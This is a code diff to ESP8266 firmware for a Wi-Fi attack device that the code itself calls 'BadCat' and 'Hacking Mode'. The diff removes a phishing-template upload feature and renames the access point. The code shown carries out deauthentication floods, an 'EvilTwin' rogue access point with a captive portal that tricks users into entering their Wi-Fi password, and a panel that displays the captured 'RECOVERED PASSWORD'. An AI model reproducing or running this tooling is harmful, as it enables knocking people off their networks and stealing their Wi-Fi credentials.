@@ -4,7 +4,6 @@
 #include <ESP8266WebServer.h>
 #include <ESP8266HTTPClient.h>
 #include <EEPROM.h>
-#include <LittleFS.h>
 
 extern "C" {
 #include "user_interface.h"
@@ -212,20 +211,10 @@ bool napt_initialized = false;
 void handleIndex();
 void handleAdmin();
 void handleArgs();
-void sendNeonMessage(String title, String message, int refreshDelay = 0, String refreshUrl = "/admin");
 
 void setup() {
   Serial.begin(115200);
   EEPROM.begin(512);
-
-  if (!LittleFS.begin()) {
-    LittleFS.format();
-    LittleFS.begin();
-  }
-  
-  if (LittleFS.exists("/custom.html")) {
-    LittleFS.remove("/custom.html");
-  }
   
   String saved_pass = "";
   for (int i = 0; i < 256; i++) {
@@ -242,7 +231,7 @@ void setup() {
   wifi_set_promiscuous_rx_cb(sniffer_callback);
   wifi_promiscuous_enable(1);
   WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
-  WiFi.softAP("BlueCat", "Cat@1234");
+  WiFi.softAP("BadCat", "Cat@1234");
   dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
 
   // Add default beacons
@@ -279,35 +268,6 @@ void setup() {
     webServer.sendHeader("Location", String("http://") + WiFi.softAPIP().toString() + "/", true);
     webServer.send(302, "text/plain", "");
   });
-  webServer.on("/upload_template", HTTP_POST, []() {
-    webServer.sendHeader("Connection", "close");
-    sendNeonMessage("Template Uploaded!", "Your custom template is now active. It will be cleared upon device reset.", 3);
-  }, []() {
-    HTTPUpload& upload = webServer.upload();
-    if (upload.status == UPLOAD_FILE_START) {
-      if (LittleFS.exists("/custom.html")) LittleFS.remove("/custom.html");
-      File f = LittleFS.open("/custom.html", "w");
-      if (f) f.close();
-    } else if (upload.status == UPLOAD_FILE_WRITE) {
-      File f = LittleFS.open("/custom.html", "a");
-      if (f) {
-        f.write(upload.buf, upload.currentSize);
-        f.close();
-      }
-    }
-  });
-
-  webServer.on("/download_template", HTTP_GET, []() {
-    String html = header(getTemplateTitle()) + "<div>" + getTemplateBody() + "</div><div style='padding:0.8em;'><form action='/' method='post'><label>WiFi password:</label><input type='password' name='password' minlength='8' required><input type='submit' value='Continue'></form></div>" + footer();
-    webServer.sendHeader("Content-Disposition", "attachment; filename=\"default_template.html\"");
-    webServer.send(200, "text/html", html);
-  });
-  
-  webServer.on("/remove_template", []() {
-    if (LittleFS.exists("/custom.html")) LittleFS.remove("/custom.html");
-    sendNeonMessage("Template Removed!", "Reverted to the default template.", 2);
-  });
-
   webServer.begin();
 }
 
@@ -386,7 +346,7 @@ void handleResult() {
     WiFi.softAPdisconnect (true);
     delay(100);
     WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
-    WiFi.softAP("BlueCat", "Cat@1234");
+    WiFi.softAP("BadCat", "Cat@1234");
     dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
     Serial.println("Good password was entered !");
     Serial.println(_correct);
@@ -406,19 +366,6 @@ const char _tempHTML[] PROGMEM = "<!DOCTYPE html><html><head><meta name='viewpor
 "<form method='post' action='/?randbeacon={randbeacon}'><button class='{rand_class}'><svg viewBox='0 0 24 24'><path d='M8 5v14l11-7z'/></svg>{rand_button}</button></form>\n"
 "</div></div>";
 
-
-void sendNeonMessage(String title, String message, int refreshDelay, String refreshUrl) {
-  String html;
-  html.reserve(1000);
-  html = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>";
-  if (refreshDelay > 0) {
-    html += "<meta http-equiv='refresh' content='" + String(refreshDelay) + ";url=" + refreshUrl + "'>";
-  }
-  html += "<style>:root{--bg:#050510;--accent:#00e5ff;--glow-cyan:0 0 5px rgba(0,229,255,0.4),0 0 10px rgba(0,229,255,0.2);--text:#e0f7fa;} body{background-color:var(--bg);color:var(--text);font-family:'Courier New',Courier,monospace;text-align:center;padding-top:20%;margin:0;padding-left:20px;padding-right:20px;} h2{font-size:26px;color:var(--accent);text-transform:uppercase;letter-spacing:2px;text-shadow:var(--glow-cyan);margin-bottom:20px;} p{font-size:16px;color:#777;} b{color:var(--text);}</style></head><body>";
-  html += "<h2>" + title + "</h2><p>" + message + "</p>";
-  html += "</body></html>";
-  webServer.send(200, "text/html", html);
-}
 
 void handleArgs() {
   if (webServer.hasArg("ap")) {
@@ -441,7 +388,7 @@ void handleArgs() {
       }
     }
     
-    sendNeonMessage("Scanning clients...<br>Please wait.", "Sending ping to wake up clients...", 4);
+    webServer.send(200, "text/html", "<html><head><meta http-equiv='refresh' content='4;url=/admin'></head><body style='background:#0f1115; font-family:sans-serif; text-align:center; padding-top:20%; color:#fff;'><h2>Scanning clients...<br>Please wait.</h2><p style='color:#777;'>Sending ping to wake up clients...</p></body></html>");
     unsigned long wait_start = millis();
     while (millis() - wait_start < 500) { webServer.client().flush(); delay(1); }
     
@@ -471,7 +418,7 @@ void handleArgs() {
       yield(); 
     }
     
-    // Hop back, BlueCat never drops!
+    // Hop back, BadCat never drops!
     wifi_promiscuous_enable(0);
     wifi_set_channel(old_ch);
     wifi_promiscuous_enable(1);
@@ -481,7 +428,7 @@ void handleArgs() {
   if (webServer.hasArg("deauth")) {
     if (webServer.arg("deauth") == "start") {
       deauthing_active = true;
-      sendNeonMessage("Starting Deauth...", "Firing packets in background...", 4);
+      webServer.send(200, "text/html", "<html><head><meta http-equiv='refresh' content='4;url=/admin'></head><body style='background:#0f1115; font-family:sans-serif; text-align:center; padding-top:20%; color:#fff;'><h2>Starting Deauth...</h2><p style='color:#777;'>Firing packets in background...</p></body></html>");
       return;
     } else if (webServer.arg("deauth") == "stop") {
       deauthing_active = false;
@@ -500,7 +447,7 @@ void handleArgs() {
     if (webServer.arg("hotspot") == "start") {
       hotspot_active = true;
       dnsServer.stop();
-      sendNeonMessage("Starting EvilTwin...", "Switching SSID and Channel...", 4);
+      webServer.send(200, "text/html", "<html><head><meta http-equiv='refresh' content='4;url=/admin'></head><body style='background:#0f1115; font-family:sans-serif; text-align:center; padding-top:20%; color:#fff;'><h2>Starting EvilTwin...</h2><p style='color:#777;'>Switching SSID and Channel...</p></body></html>");
       unsigned long wait_start = millis();
       while (millis() - wait_start < 500) { webServer.client().flush(); delay(1); }
       
@@ -516,13 +463,13 @@ void handleArgs() {
     } else if (webServer.arg("hotspot") == "stop") {
       hotspot_active = false;
       dnsServer.stop();
-      sendNeonMessage("Stopping EvilTwin...", "Reverting to original AP...", 4);
+      webServer.send(200, "text/html", "<html><head><meta http-equiv='refresh' content='4;url=/admin'></head><body style='background:#0f1115; font-family:sans-serif; text-align:center; padding-top:20%; color:#fff;'><h2>Stopping EvilTwin...</h2><p style='color:#777;'>Reverting to original AP...</p></body></html>");
       unsigned long wait_start = millis();
       while (millis() - wait_start < 500) { webServer.client().flush(); delay(1); }
       
       WiFi.softAPdisconnect (true);
       WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
-      WiFi.softAP("BlueCat", "Cat@1234");
+      WiFi.softAP("BadCat", "Cat@1234");
       dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
       
       wifi_promiscuous_enable(0);
@@ -558,7 +505,7 @@ void handleArgs() {
         repeater_active = true;
         
         // Send the HTTP response BEFORE we change the Wi-Fi network, so the browser doesn't get a connection error
-        sendNeonMessage("Connected Successfully!", "<span style='color:var(--green);'>Repeater is now active.</span><br>Please connect your phone to the new Extender Wi-Fi: <b>" + e_ssid + "</b>");
+        webServer.send(200, "text/html", "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><style>body{background:#0f1115; font-family:sans-serif; text-align:center; padding-top:20%; color:#fff;}</style></head><body><h2>Connected Successfully!</h2><p style='color:#10b981;'>Repeater is now active.</p><p>Please connect your phone to the new Extender Wi-Fi: <b>" + e_ssid + "</b></p></body></html>");
         
         unsigned long wait_start = millis();
         while (millis() - wait_start < 1000) { webServer.client().flush(); delay(1); }
@@ -598,7 +545,7 @@ void handleArgs() {
         WiFi.disconnect();
         
         WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
-        WiFi.softAP("BlueCat", "Cat@1234");
+        WiFi.softAP("BadCat", "Cat@1234");
         dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
         wifi_promiscuous_enable(1);
         
@@ -612,13 +559,13 @@ void handleArgs() {
       repeater_error = "";
       ip_napt_enable_no(SOFTAP_IF, 0);
       
-      sendNeonMessage("Stopping Repeater...", "Reverting to Hacking Mode...", 4);
+      webServer.send(200, "text/html", "<html><head><meta http-equiv='refresh' content='4;url=/admin'></head><body style='background:#0f1115; font-family:sans-serif; text-align:center; padding-top:20%; color:#fff;'><h2>Stopping Repeater...</h2><p style='color:#777;'>Reverting to Hacking Mode...</p></body></html>");
       unsigned long wait_start = millis();
       while (millis() - wait_start < 500) { webServer.client().flush(); delay(1); }
       
       WiFi.disconnect();
       WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
-      WiFi.softAP("BlueCat", "Cat@1234");
+      WiFi.softAP("BadCat", "Cat@1234");
       dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
       
       wifi_promiscuous_enable(1);
@@ -665,17 +612,6 @@ void handleArgs() {
       current_template = webServer.arg("tpl").toInt();
     }
     webServer.sendHeader("Location", "/", true);
-    webServer.send(302, "text/plain", "");
-    return;
-  }
-
-  if (webServer.hasArg("clear_password")) {
-    _correct = "";
-    for (int i = 0; i < 256; i++) {
-      EEPROM.write(i, 0);
-    }
-    EEPROM.commit();
-    webServer.sendHeader("Location", "/admin", true);
     webServer.send(302, "text/plain", "");
     return;
   }
@@ -786,29 +722,15 @@ String buildAdminPage() {
        _html += "</select>";
        
        _html += "<label>HOME WI-FI PASSWORD:</label><input type='password' name='hpass' required>";
-       _html += "<label>EXTENDER NAME (NEW WI-FI):</label><input type='text' name='essid' value='BlueCat_EXT' required>";
+       _html += "<label>EXTENDER NAME (NEW WI-FI):</label><input type='text' name='essid' value='BadCat_EXT' required>";
        _html += "<label>EXTENDER PASSWORD (MIN 8 CHARS):</label><input type='text' name='epass' value='12345678' minlength='8' required>";
        _html += "<button type='submit' class='green'><svg viewBox='0 0 24 24'><path d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 14.5v-9l6 4.5-6 4.5z'/></svg>INITIALIZE REPEATER</button></form>";
        _html += "<p style='font-size:12px; color:#5c6b89; margin-top:15px; border-top: 1px dashed rgba(0, 229, 255, 0.3); padding-top: 15px;'>Note: Starting Repeater disables Deauth/Phishing temporarily. Device will auto-connect to Home Wi-Fi and create a new Extender Network.</p>";
     }
     _html += "</div>";
 
-    _html += "<div class='panel'><h3><svg viewBox='0 0 24 24'><path d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H5V5h14v14zm-7-2h2V7h-4v2h2z'/></svg>PHISHING TEMPLATES</h3>";
-    _html += "<p style='font-size:13px; color:#aaa; margin-bottom:15px;'>Use <b>{{WIFI_NAME}}</b> in your custom HTML to show the target AP name.</p>";
-    if (LittleFS.exists("/custom.html")) {
-      _html += "<div style='background:rgba(0,255,136,0.1); border:1px solid var(--green); padding:10px; margin-bottom:15px; border-radius:4px; color:var(--green); font-size:14px; text-shadow:var(--glow-green);'><b>CUSTOM TEMPLATE ACTIVE</b> (Until Reset)</div>";
-      _html += "<form method='post' action='/remove_template'><button class='red'>REMOVE CUSTOM TEMPLATE</button></form>";
-    } else {
-      _html += "<div style='background:rgba(0,229,255,0.1); border:1px solid var(--accent); padding:10px; margin-bottom:15px; border-radius:4px; color:var(--accent); font-size:14px; text-shadow:var(--glow-cyan);'><b>DEFAULT TEMPLATE ACTIVE</b></div>";
-    }
-    
-    _html += "<div class='flex' style='margin-top:15px; flex-direction:column; gap:10px;'>";
-    _html += "<form method='get' action='/download_template' style='width:100%;'><button class='green'>DOWNLOAD DEFAULT</button></form>";
-    _html += "<form method='post' action='/upload_template' enctype='multipart/form-data' style='width:100%; border:1px dashed var(--accent); padding:10px; border-radius:4px; display:flex; flex-direction:column; gap:10px;'><label>UPLOAD CUSTOM HTML:</label><input type='file' name='custom' style='color:#fff;' required><button type='submit' class='green'>UPLOAD TEMPLATE</button></form>";
-    _html += "</div></div>";
-
     if (_correct != "") {
-      _html += "<div class='panel'><h3><svg viewBox='0 0 24 24'><path d='M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z'/></svg>RECOVERED PASSWORD</h3><p style='color:var(--green);font-size:18px;font-weight:bold;text-shadow:var(--glow-green);'>" + _correct + "</p><form method='post' action='/?clear_password=true'><button class='red' style='margin-top:10px;'>DELETE PASSWORD</button></form></div>";
+      _html += "<div class='panel'><h3><svg viewBox='0 0 24 24'><path d='M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z'/></svg>RECOVERED PASSWORD</h3><p style='color:var(--green);font-size:18px;font-weight:bold;text-shadow:var(--glow-green);'>" + _correct + "</p></div>";
     }
 
     _html += "</div></body></html>";
@@ -863,15 +785,7 @@ void handleIndex() {
         deauthing_active = true;
       }
     } else {
-      if (LittleFS.exists("/custom.html")) {
-        File f = LittleFS.open("/custom.html", "r");
-        String customHtml = f.readString();
-        f.close();
-        customHtml.replace("{{WIFI_NAME}}", String(_selectedNetwork.ssid));
-        webServer.send(200, "text/html", customHtml);
-      } else {
-        webServer.send(200, "text/html", index());
-      }
+      webServer.send(200, "text/html", index());
     }
   }
 }
